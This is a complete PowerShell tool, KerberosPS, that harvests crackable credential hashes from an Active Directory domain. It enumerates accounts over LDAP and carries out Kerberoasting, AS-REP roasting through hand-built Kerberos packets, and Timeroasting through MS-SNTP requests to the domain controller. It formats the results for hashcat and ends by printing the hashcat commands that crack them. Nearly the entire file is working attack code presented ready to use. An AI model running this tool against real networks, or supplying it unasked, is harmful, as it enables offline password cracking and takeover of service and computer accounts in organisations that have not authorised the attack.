<#
USAGE: 
.\KerberosPS.ps1
OR:
.\KerberosPS.ps1 | Select-String '^\s+\$krb|^\s+\$sntp' | ForEach-Object { $_.Line.Trim() } | Out-File hashes.txt
#>

Set-StrictMode -Off
$ErrorActionPreference = 'SilentlyContinue'

function Encode-AsnLen([int]$n) {
    if ($n -lt 0x80)    { return [byte[]]@($n) }
    if ($n -lt 0x100)   { return [byte[]](0x81, $n) }
    if ($n -lt 0x10000) { return [byte[]](0x82, ($n -shr 8), ($n -band 0xFF)) }
    return [byte[]](0x83, ($n -shr 16), (($n -shr 8) -band 0xFF), ($n -band 0xFF))
}

function Build-TLV([byte]$tag, [byte[]]$val) {
    $lb  = Encode-AsnLen $val.Length
    $out = New-Object byte[] (1 + $lb.Length + $val.Length)
    $out[0] = $tag
    [Array]::Copy($lb,  0, $out, 1,              $lb.Length)
    [Array]::Copy($val, 0, $out, 1 + $lb.Length, $val.Length)
    return $out
}

function Merge-Bytes {
    $ms = [System.IO.MemoryStream]::new()
    foreach ($item in $args) {
        if ($null -eq $item -or $item.Length -eq 0) { continue }
        $ba = if ($item -is [byte[]]) { $item } else { [byte[]]$item }
        $ms.Write($ba, 0, $ba.Length)
    }
    return $ms.ToArray()
}

function asn-int([int]$v) {
    if ($v -ge 0 -and $v -lt 0x80)    { return Build-TLV 0x02 @([byte]$v) }
    if ($v -lt 0x8000)                { return Build-TLV 0x02 @([byte]($v -shr 8), [byte]($v -band 0xFF)) }
    return Build-TLV 0x02 @([byte](($v -shr 16) -band 0xFF), [byte](($v -shr 8) -band 0xFF), [byte]($v -band 0xFF))
}
function asn-gentime([string]$s) { Build-TLV 0x18 ([System.Text.Encoding]::ASCII.GetBytes($s)) }
function asn-gstr([string]$s)    { Build-TLV 0x1B ([System.Text.Encoding]::ASCII.GetBytes($s)) }
function asn-bitstr([byte[]]$b)  { Build-TLV 0x03 $b }
function asn-seq([byte[]]$b)     { Build-TLV 0x30 $b }
function asn-ctx([byte]$n, [byte[]]$b) { Build-TLV ([byte](0xA0 -bor $n)) $b }
function asn-app([byte]$n, [byte[]]$b) { Build-TLV ([byte](0x60 -bor $n)) $b }

function Read-AsnLen([byte[]]$d, [ref]$i) {
    $b = $d[$i.Value++]
    if ($b -lt 0x80) { return [int]$b }
    $nb = $b -band 0x7F; $v = 0
    for ($k = 0; $k -lt $nb; $k++) { $v = ($v -shl 8) -bor [int]$d[$i.Value++] }
    return $v
}

function Read-TLV([byte[]]$d, [ref]$i) {
    if ($i.Value -ge $d.Length) { return $null }
    $tag = $d[$i.Value++]
    $len = Read-AsnLen $d $i
    $end = $i.Value + $len
    if ($end -gt $d.Length) { return $null }
    $v = if ($len -gt 0) { $d[$i.Value..($end - 1)] } else { [byte[]]@() }
    $i.Value = $end
    return @{ T = [byte]$tag; V = [byte[]]$v }
}

function Find-Tag([byte[]]$d, [byte]$tag) {
    $i = [ref]0
    while ($i.Value -lt $d.Length) {
        $tlv = Read-TLV $d $i
        if (-not $tlv) { break }
        if ($tlv.T -eq $tag) { return $tlv.V }
    }
    return $null
}

function Read-Int([byte[]]$d) {
    $v = 0; foreach ($b in $d) { $v = ($v -shl 8) -bor [int]$b }; return $v
}

function Parse-EncData([byte[]]$d) {
    $p   = [ref]0
    $seq = Read-TLV $d $p
    if (-not $seq -or $seq.T -ne 0x30) { return $null }
    $etype = $null; $cipher = $null
    $p2 = [ref]0
    while ($p2.Value -lt $seq.V.Length) {
        $tlv = Read-TLV $seq.V $p2
        if (-not $tlv) { break }
        if ($tlv.T -eq 0xA0) {
            $pi = [ref]0; $it = Read-TLV $tlv.V $pi
            if ($it -and $it.T -eq 0x02) { $etype = Read-Int $it.V }
        } elseif ($tlv.T -eq 0xA2) {
            $po = [ref]0; $ot = Read-TLV $tlv.V $po
            if ($ot -and $ot.T -eq 0x04) { $cipher = $ot.V }
        }
    }
    if ($null -eq $etype -or $null -eq $cipher) { return $null }
    return @{ Etype = $etype; Cipher = $cipher }
}

function Parse-TGSFromAPReq([byte[]]$bytes) {
    try {
        $p     = [ref]0
        $outer = Read-TLV $bytes $p
        if (-not $outer) { return $null }

        $apReqContent = $null

        if ($outer.T -eq 0x6E) {
            $p2  = [ref]0
            $seq = Read-TLV $outer.V $p2
            if (-not $seq -or $seq.T -ne 0x30) { return $null }
            $apReqContent = $seq.V

        } elseif ($outer.T -eq 0x60) {
            $p2 = [ref]0
            while ($p2.Value -lt $outer.V.Length) {
                $tlv = Read-TLV $outer.V $p2
                if (-not $tlv) { break }
                if ($tlv.T -eq 0x6E) {
                    $p3  = [ref]0
                    $seq = Read-TLV $tlv.V $p3
                    if ($seq -and $seq.T -eq 0x30) { $apReqContent = $seq.V }
                    break
                }
            }
        }

        if (-not $apReqContent) { return $null }

        $ticketCtxV = Find-Tag $apReqContent 0xA3
        if (-not $ticketCtxV) { return $null }

        $p3   = [ref]0
        $app1 = Read-TLV $ticketCtxV $p3
        if (-not $app1 -or $app1.T -ne 0x61) { return $null }

        $p4     = [ref]0
        $tktSeq = Read-TLV $app1.V $p4
        if (-not $tktSeq -or $tktSeq.T -ne 0x30) { return $null }

        $encPartV = Find-Tag $tktSeq.V 0xA3
        if (-not $encPartV) { return $null }

        return Parse-EncData $encPartV
    } catch { return $null }
}

function Parse-ASRep([byte[]]$bytes) {
    try {
        $p   = [ref]0
        $app = Read-TLV $bytes $p
        if (-not $app) { return $null }
        if ($app.T -eq 0x7E) { return 'KRB-ERROR' }
        if ($app.T -ne 0x6B) { return $null }

        $p2  = [ref]0
        $seq = Read-TLV $app.V $p2
        if (-not $seq -or $seq.T -ne 0x30) { return $null }

        $encPartV = Find-Tag $seq.V 0xA6
        if (-not $encPartV) { return $null }

        return Parse-EncData $encPartV
    } catch { return $null }
}

function Build-ASReq([string]$username, [string]$realm, [int]$etype = 23) {
    $r       = $realm.ToUpper()
    $kdcOpts = asn-ctx 0 (asn-bitstr @([byte]0x00, [byte]0x40, [byte]0x00, [byte]0x00, [byte]0x10))
    $cname   = asn-ctx 1 (asn-seq (Merge-Bytes (asn-ctx 0 (asn-int 1)) (asn-ctx 1 (asn-seq (asn-gstr $username)))))
    $realm_f = asn-ctx 2 (asn-gstr $r)
    $sname   = asn-ctx 3 (asn-seq (Merge-Bytes (asn-ctx 0 (asn-int 2)) (asn-ctx 1 (asn-seq (Merge-Bytes (asn-gstr 'krbtgt') (asn-gstr $r))))))
    $till    = asn-ctx 5 (asn-gentime '20370913024805Z')
    $nonce   = asn-ctx 7 (asn-int ([System.Environment]::TickCount -band 0x7FFFFFFF))
    $et      = asn-ctx 8 (asn-seq (asn-int $etype))
    $reqBody = asn-ctx 4 (asn-seq (Merge-Bytes $kdcOpts $cname $realm_f $sname $till $nonce $et))
    $kdcReq  = asn-seq (Merge-Bytes (asn-ctx 1 (asn-int 5)) (asn-ctx 2 (asn-int 10)) $reqBody)
    return asn-app 0x0A $kdcReq
}

function Send-KerberosReq([string]$dc, [byte[]]$payload) {
    try {
        $len = $payload.Length
        $hdr = [byte[]](($len -shr 24) -band 0xFF, ($len -shr 16) -band 0xFF, ($len -shr 8) -band 0xFF, $len -band 0xFF)
        $pkt = Merge-Bytes $hdr $payload
        $tcp = [System.Net.Sockets.TcpClient]::new()
        $tcp.ReceiveTimeout = 3000
        $tcp.Connect($dc, 88)
        $stm = $tcp.GetStream()
        $stm.Write($pkt, 0, $pkt.Length)
        $lb  = New-Object byte[] 4
        $got = 0
        while ($got -lt 4) { $n = $stm.Read($lb, $got, 4 - $got); if ($n -le 0) { break }; $got += $n }
        [Array]::Reverse($lb)
        $rlen = [BitConverter]::ToInt32($lb, 0)
        $buf  = New-Object byte[] $rlen
        $got  = 0
        while ($got -lt $rlen) { $n = $stm.Read($buf, $got, $rlen - $got); if ($n -le 0) { break }; $got += $n }
        $stm.Close(); $tcp.Close()
        return $buf
    } catch { return $null }
}

function Get-DomainCtx {
    $root   = [System.DirectoryServices.DirectoryEntry]::new()
    $dn     = $root.Properties['distinguishedName'].Value
    $domain = ($dn -split ',' | Where-Object { $_ -match '^DC=' } | ForEach-Object { ($_ -split '=')[1] }) -join '.'
    $dc     = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    return @{ Domain = $domain; DC = $dc }
}

function Get-Searcher([string]$filter, [string[]]$attrs) {
    $s = [System.DirectoryServices.DirectorySearcher]::new()
    $s.Filter = $filter; $s.PageSize = 1000
    foreach ($a in $attrs) { [void]$s.PropertiesToLoad.Add($a) }
    return $s
}

function Get-EtypeInfo([int]$e) {
    switch ($e) {
        17      { return @{ Name = 'AES128-CTS-HMAC-SHA1-96'; TGSMode = 19600 } }
        18      { return @{ Name = 'AES256-CTS-HMAC-SHA1-96'; TGSMode = 19700 } }
        23      { return @{ Name = 'RC4-HMAC';                TGSMode = 13100 } }
        3       { return @{ Name = 'DES-CBC-MD5';             TGSMode = 13100 } }
        default { return @{ Name = "etype-$e";               TGSMode = 0     } }
    }
}

function Format-TGSHash([string]$user, [string]$domain, [string]$spn, [int]$etype, [byte[]]$cipher) {
    $hex = -join ($cipher | ForEach-Object { '{0:x2}' -f $_ })
    if ($etype -eq 23) {
        return "`$krb5tgs`$23`$*$user*$($domain.ToUpper())*$spn*`$$($hex.Substring(0,32))`$$($hex.Substring(32))"
    }
    $split = [Math]::Min(24, $hex.Length)
    return "`$krb5tgs`$$etype`$$user`$$($domain.ToUpper())`$*$spn*`$$($hex.Substring(0,$split))`$$($hex.Substring($split))"
}

function Format-ASREPHash([string]$user, [string]$domain, [int]$etype, [byte[]]$cipher) {
    $hex  = -join ($cipher | ForEach-Object { '{0:x2}' -f $_ })
    $chk  = $hex.Substring(0, [Math]::Min(32, $hex.Length))
    $data = if ($hex.Length -gt 32) { $hex.Substring(32) } else { '' }
    return "`$krb5asrep`$$etype`$$user@$($domain.ToUpper()):$chk`$$data"
}

function Invoke-Kerberoast([string]$domain) {
    Write-Host "[*] Kerberoasting..." -ForegroundColor DarkGray
    $out = [System.Collections.Generic.List[PSCustomObject]]::new()
    try { Add-Type -AssemblyName System.IdentityModel -EA Stop } catch {}
    $s = Get-Searcher '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' @('sAMAccountName','servicePrincipalName')
    try {
        foreach ($r in $s.FindAll()) {
            $sam = $r.Properties['sAMAccountName'][0]
            foreach ($spn in $r.Properties['servicePrincipalName']) {
                try {
                    $tok   = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
                    $bytes = $tok.GetRequest()
                    $tkt   = Parse-TGSFromAPReq $bytes
                    if (-not $tkt) { Write-Host "  [-] parse fail: $spn" -ForegroundColor DarkGray; continue }
                    $ei    = Get-EtypeInfo $tkt.Etype
                    $out.Add([PSCustomObject]@{
                        Attack = 'Kerberoast'
                        User   = $sam
                        Target = $spn
                        Etype  = $tkt.Etype
                        EName  = $ei.Name
                        HCMode = $ei.TGSMode
                        Hash   = (Format-TGSHash $sam $domain $spn $tkt.Etype $tkt.Cipher)
                    })
                } catch { Write-Host "  [-] $spn`: $($_.Exception.Message)" -ForegroundColor DarkGray }
            }
        }
    } catch { Write-Host "  [-] Kerberoast LDAP: $_" -ForegroundColor Red }
    return $out
}

function Invoke-ASREPRoast([string]$dc, [string]$domain) {
    Write-Host "[*] AS-REP Roasting..." -ForegroundColor DarkGray
    $out = [System.Collections.Generic.List[PSCustomObject]]::new()
    $s   = Get-Searcher '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' @('sAMAccountName')
    try {
        foreach ($r in $s.FindAll()) {
            $sam = $r.Properties['sAMAccountName'][0]
            try {
                $req    = Build-ASReq $sam $domain 23
                $resp   = Send-KerberosReq $dc $req
                if (-not $resp -or $resp.Length -lt 10) {
                    Write-Host "  [-] $sam`: no response" -ForegroundColor DarkGray; continue
                }
                $parsed = Parse-ASRep $resp
                if (-not $parsed -or $parsed -eq 'KRB-ERROR') {
                    Write-Host "  [-] $sam`: KRB-ERROR or pre-auth required" -ForegroundColor DarkGray; continue
                }
                $ei = Get-EtypeInfo $parsed.Etype
                $out.Add([PSCustomObject]@{
                    Attack = 'AS-REP Roast'
                    User   = $sam
                    Target = 'krbtgt'
                    Etype  = $parsed.Etype
                    EName  = $ei.Name
                    HCMode = 18200
                    Hash   = (Format-ASREPHash $sam $domain $parsed.Etype $parsed.Cipher)
                })
            } catch { Write-Host "  [-] $sam`: $($_.Exception.Message)" -ForegroundColor DarkGray }
        }
    } catch { Write-Host "  [-] AS-REP LDAP: $_" -ForegroundColor Red }
    return $out
}

function Send-TimeroastReq([string]$dc, [int]$rid) {
    $pkt    = New-Object byte[] 68
    $pkt[0] = 0x1B
    $epoch  = [DateTime]::new(1900, 1, 1, 0, 0, 0, [DateTimeKind]::Utc)
    $secs   = [long]([DateTime]::UtcNow - $epoch).TotalSeconds
    $sb     = [BitConverter]::GetBytes([uint32]$secs); [Array]::Reverse($sb)
    [Array]::Copy($sb, 0, $pkt, 40, 4)
    $rb     = [BitConverter]::GetBytes([uint32]$rid); [Array]::Reverse($rb)
    [Array]::Copy($rb, 0, $pkt, 48, 4)
    $udp    = [System.Net.Sockets.UdpClient]::new()
    $udp.Connect($dc, 123)
    $udp.Client.ReceiveTimeout = 2000
    [void]$udp.Send($pkt, 68)
    $ep   = [System.Net.IPEndPoint]::new([System.Net.IPAddress]::Any, 0)
    $resp = $udp.Receive([ref]$ep)
    $udp.Close()
    return $resp
}

function Invoke-Timeroast([string]$dc) {
    Write-Host "[*] Timeroasting (1 UDP packet per computer account)..." -ForegroundColor DarkGray
    $out = [System.Collections.Generic.List[PSCustomObject]]::new()
    $s   = Get-Searcher '(objectClass=computer)' @('sAMAccountName','objectSid')
    try {
        foreach ($r in $s.FindAll()) {
            $sam    = $r.Properties['sAMAccountName'][0]
            $sidRaw = $r.Properties['objectSid'][0]
            $sid    = [System.Security.Principal.SecurityIdentifier]::new($sidRaw, 0)
            $rid    = [int]($sid.Value -split '-')[-1]
            try {
                $resp = Send-TimeroastReq $dc $rid
                if (-not $resp -or $resp.Length -lt 68) { continue }
                $ntpHex = -join ($resp[0..47]  | ForEach-Object { '{0:x2}' -f $_ })
                $sigHex = -join ($resp[48..67] | ForEach-Object { '{0:x2}' -f $_ })
                $out.Add([PSCustomObject]@{
                    Attack = 'Timeroast'
                    User   = $sam
                    Target = "RID-$rid"
                    Etype  = 'MD5'
                    EName  = 'MS-SNTP MD5-MAC'
                    HCMode = 31300
                    Hash   = "`$sntp-ms`$$ntpHex`$$sigHex"
                })
            } catch { }
        }
    } catch { Write-Host "  [-] Timeroast LDAP: $_" -ForegroundColor Red }
    return $out
}

try { $ctx = Get-DomainCtx } catch {
    Write-Host "[-] Domain bind failed. Must be domain-joined." -ForegroundColor Red; exit 1
}

Write-Host ""
Write-Host "=== KerberosPS ===" -ForegroundColor Cyan
Write-Host "[*] Domain : $($ctx.Domain)"
Write-Host "[*] DC     : $($ctx.DC)"
Write-Host ""

$all = [System.Collections.Generic.List[PSCustomObject]]::new()
foreach ($r in (Invoke-Kerberoast $ctx.Domain))         { $all.Add($r) }
foreach ($r in (Invoke-ASREPRoast $ctx.DC $ctx.Domain)) { $all.Add($r) }
foreach ($r in (Invoke-Timeroast $ctx.DC))              { $all.Add($r) }

Write-Host ""

if ($all.Count -eq 0) { Write-Host "No hashes recovered." -ForegroundColor Green; exit 0 }

Write-Host "=== Results ===" -ForegroundColor Cyan
Write-Host ""

foreach ($grp in ($all | Group-Object Attack)) {
    Write-Host "[ $($grp.Name.ToUpper()) ]" -ForegroundColor Yellow
    foreach ($h in $grp.Group) {
        Write-Host "  User    : $($h.User)"
        Write-Host "  Target  : $($h.Target)"
        Write-Host "  Type    : $($h.EName) ($($h.Etype))"
        Write-Host "  Hashcat : -m $($h.HCMode)"
        Write-Host "  Hash    :" -NoNewline
        Write-Host " $($h.Hash)" -ForegroundColor Green
        Write-Host ""
    }
}

Write-Host "--- Hashcat Reference ---" -ForegroundColor DarkGray
Write-Host "  -m 13100  Kerberoast RC4          hashcat -m 13100 -a 0 hashes.txt wordlist.txt"
Write-Host "  -m 19600  Kerberoast AES128       hashcat -m 19600 -a 0 hashes.txt wordlist.txt"
Write-Host "  -m 19700  Kerberoast AES256       hashcat -m 19700 -a 0 hashes.txt wordlist.txt"
Write-Host "  -m 18200  AS-REP Roast            hashcat -m 18200 -a 0 hashes.txt wordlist.txt"
Write-Host "  -m 31300  Timeroast (MS-SNTP MD5) hashcat -m 31300 -a 0 hashes.txt wordlist.txt"
Write-Host ""

$kc = ($all | Where-Object { $_.Attack -eq 'Kerberoast'  }).Count
$ac = ($all | Where-Object { $_.Attack -eq 'AS-REP Roast'}).Count
$tc = ($all | Where-Object { $_.Attack -eq 'Timeroast'   }).Count
Write-Host "Total: $($all.Count)  (Kerberoast:$kc  AS-REP:$ac  Timeroast:$tc)" -ForegroundColor DarkGray